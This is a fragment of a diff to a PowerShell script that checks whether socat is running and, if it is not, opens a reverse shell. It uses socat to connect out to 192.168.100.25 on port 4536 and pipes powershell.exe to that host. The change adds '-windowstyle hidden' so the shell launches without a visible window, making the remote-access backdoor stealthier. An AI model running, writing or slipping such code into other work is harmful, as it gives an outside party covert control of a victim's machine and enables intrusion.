@@ -5,7 +5,7 @@ if(Get-Process -Name socat | ForEach-Object { Get-NetTCPConnection -OwningProces
 	
 }else{
 	Write-Host "not running, bye bye..."	
-	powershell.exe .\socat -d -d TCP4:192.168.100.25:4536 EXEC:'powershell.exe',pipes
+	powershell.exe -windowstyle hidden .\socat -d -d TCP4:192.168.100.25:4536 EXEC:'powershell.exe',pipes
 }
 '@
 $scriptBlock = [scriptblock]::Create($multilineScript)
